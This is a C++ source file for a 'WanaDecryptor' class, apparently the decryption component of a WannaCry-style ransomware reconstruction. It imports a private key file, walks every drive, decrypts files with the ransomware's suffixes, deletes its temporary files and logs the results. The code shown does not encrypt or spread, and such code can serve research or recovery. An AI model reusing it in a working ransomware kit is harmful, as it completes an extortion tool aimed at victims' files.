#include <shlobj.h>

#include "WanaDecryptor.h"
#include "../Common/common.h"
#include "FileList.h"

WanaDecryptor::WanaDecryptor()
{
	m_pWanaZip = NULL;
	m_hDecryptLog = INVALID_HANDLE_VALUE;
	if (!Init()) {
		DEBUG("Init WanaDecryptor fails: base path not exists\n");
		return;
	}
	if (!InitWanaZip(0)) {
		DEBUG("Init WanaDecryptor fails: InitWanaZip(0)\n");
		return;
	}
}

WanaDecryptor::~WanaDecryptor()
{
	if (m_pWanaZip) {
		delete m_pWanaZip;
		m_pWanaZip = NULL;
	}
	if (m_hDecryptLog != INVALID_HANDLE_VALUE) {
		CloseHandle(m_hDecryptLog);
		m_hDecryptLog = INVALID_HANDLE_VALUE;
	}
}

BOOL WanaDecryptor::Init()
{
	HRESULT result = SHGetFolderPath(
		NULL,
		CSIDL_PERSONAL,
		NULL,
		SHGFP_TYPE_CURRENT,
		m_BasePath);
	_tcscat_s(m_BasePath, MAX_PATH, _T("\\"));
	_tcscat_s(m_BasePath, MAX_PATH, BASE_DIRNAME);
	if (GetFileAttributes(m_BasePath) ==
		INVALID_FILE_ATTRIBUTES) {
		return FALSE;
	}
	return TRUE;
}

BOOL WanaDecryptor::InitWanaZip(DWORD nKeyNo)
{
	TCHAR szDKYFile[MAX_PATH];
	BOOL bResult = FALSE;
	_stprintf_s(szDKYFile, MAX_PATH,
		_T("%s\\%08x.dky"), m_BasePath, nKeyNo);
	if (m_pWanaZip) {
		return TRUE;
	}
	if (GetFileAttributes(szDKYFile) !=
		INVALID_FILE_ATTRIBUTES) {
		m_pWanaZip = new WanaZip();
		bResult = m_pWanaZip->ImportPrivateKey(szDKYFile);
		if (!bResult) {
			DEBUG("Import %s error\n", szDKYFile);
		}
	}
	return bResult;
}

BOOL WanaDecryptor::CreateDecryptLog()
{
	TCHAR szFileName[MAX_PATH];
	_stprintf_s(szFileName, MAX_PATH,
		_T("%s\\decrypt.log"), m_BasePath);
	if (!m_hDecryptLog) {
		if ((m_hDecryptLog = CreateFile(
			szFileName,
			GENERIC_WRITE,
			FILE_SHARE_READ,
			NULL,
			OPEN_ALWAYS,
			FILE_ATTRIBUTE_NORMAL,
			NULL
		)) == INVALID_HANDLE_VALUE) {
			_tprintf(_T("Open temp file %s error\n"),
				szFileName);
			return FALSE;
		}
		SetFilePointerEx(
			m_hDecryptLog,
			{ 0 },
			NULL,
			FILE_END);
	}
	return TRUE;
}

BOOL WanaDecryptor::DecryptTraverse(LPCTSTR pPathName)
{
	WIN32_FIND_DATA FindFileData;
	TCHAR szDir[MAX_PATH];
	TCHAR szPath[MAX_PATH];
	//size_t length_of_arg;
	HANDLE hFind = INVALID_HANDLE_VALUE;
	if (_tcslen(pPathName) > (MAX_PATH - 3))
	{
		DEBUG("\nDirectory path is too long %d.\n",
			(int) _tcslen(pPathName));
		return FALSE;
	}
	_stprintf_s(szDir, MAX_PATH, _T("%s\\*"), pPathName);
	hFind = FindFirstFile(szDir, &FindFileData);
	DEBUG("Enter dir %s\n", pPathName);
	if (INVALID_HANDLE_VALUE == hFind)
	{
		if (GetLastError() == ERROR_ACCESS_DENIED) {
			return FALSE;
		}
		DEBUG("FindFirstFile Error: %d %s\n", GetLastError(), szDir);
		return FALSE;
	}
	do
	{
		if (_tcscmp(FindFileData.cFileName, _T(".")) &&
			_tcscmp(FindFileData.cFileName, _T(".."))) {
			if (_tcslen(pPathName) + 1 +
				_tcslen(FindFileData.cFileName) > (MAX_PATH - 3))
			{
				DEBUG("\nDirectory path is too long: %s\n",
					FindFileData.cFileName);
				return FALSE;
			}
			_stprintf_s(szPath, MAX_PATH,
				_T("%s\\%s"), pPathName, FindFileData.cFileName);
			if (FindFileData.dwFileAttributes &
				FILE_ATTRIBUTE_DIRECTORY)
			{
				if (_tcscmp(FindFileData.cFileName, _T(".")) &&
					_tcscmp(FindFileData.cFileName, _T(".."))) {
					if (!isIgnorePath(szPath, FindFileData.cFileName)) {
						DecryptTraverse(szPath);
					}
				}
			}
			else if (!(FindFileData.dwFileAttributes &
				FILE_ATTRIBUTE_READONLY))
			{
				LPTSTR pSuffix = (LPTSTR)_tcsrchr(
					FindFileData.cFileName, _T('.'));
				if (pSuffix) {
					if (!_tcsicmp(pSuffix, WZIP_SUFFIX_CIPHER) ||
						!_tcsicmp(pSuffix, WZIP_SUFFIX_WRITESRC)) {
						DEBUG("Decrypt file %s\n", szPath);
						if (!InitWanaZip(0)) {
							DEBUG("Import error\n");
							return FALSE;
						}
						if (m_pWanaZip->Decrypt(szPath)) {
							if (m_hDecryptLog !=
								INVALID_HANDLE_VALUE) {
								WriteFile(
									m_hDecryptLog,
									szPath,
									(DWORD) (sizeof(TCHAR) * _tcslen(szPath)),
									NULL,
									0);
								WriteFile(
									m_hDecryptLog,
									_T("\n"),
									(DWORD) sizeof(TCHAR),
									NULL,
									0);
							}
						}
					}
					else if (!_tcsicmp(pSuffix, WZIP_SUFFIX_TEMP)) {
						DEBUG("Delete file %s\n", szPath);
						DeleteFile(szPath);
					}
				}
			}
		}
	} while (FindNextFile(hFind, &FindFileData) != 0);
	FindClose(hFind);
	return TRUE;
}

BOOL WanaDecryptor::Decrypt(LPCTSTR pPath)
{
	DWORD attr;
	DEBUG("Decrypting %s\n", pPath);
	if ((attr = GetFileAttributes(pPath)) ==
		INVALID_FILE_ATTRIBUTES) {
		DEBUG("Can't get attributes of %s\n", pPath);
		return FALSE;
	}
	if (attr & FILE_ATTRIBUTE_READONLY) {
		DEBUG("%s is read only\n", pPath);
		return FALSE;
	}
	if (attr & FILE_ATTRIBUTE_DIRECTORY) {
		DecryptTraverse(pPath);
	}
	else {
		if (!InitWanaZip(0)) {
			DEBUG("Import error\n");
			return FALSE;
		}
		DEBUG("Decrypt file %s\n", pPath);
		BOOL bResult = m_pWanaZip->Decrypt(pPath);
		if (bResult) {
			if (m_hDecryptLog != INVALID_HANDLE_VALUE) {
				WriteFile(
					m_hDecryptLog,
					pPath,
					(DWORD) (sizeof(TCHAR) * _tcslen(pPath)),
					NULL,
					0);
				WriteFile(
					m_hDecryptLog,
					_T("\n"),
					(DWORD) sizeof(TCHAR),
					NULL,
					0);
			}
		}
		return bResult;
	}
	return TRUE;
}

BOOL WanaDecryptor::DecryptAll()
{
	//ULONG i = 0;
	TCHAR szRootPathName[16] = ENCRYPT_ROOT_PATH;
	DWORD drivers = GetLogicalDrives();
	for (int DiskNO = 25; DiskNO >= 0; DiskNO--) {
		drivers = GetLogicalDrives();
		szRootPathName[0] = DiskNO + 65;
		if ((drivers >> DiskNO) & 1) {
			Decrypt(szRootPathName);
		}
	}
	return TRUE;
}
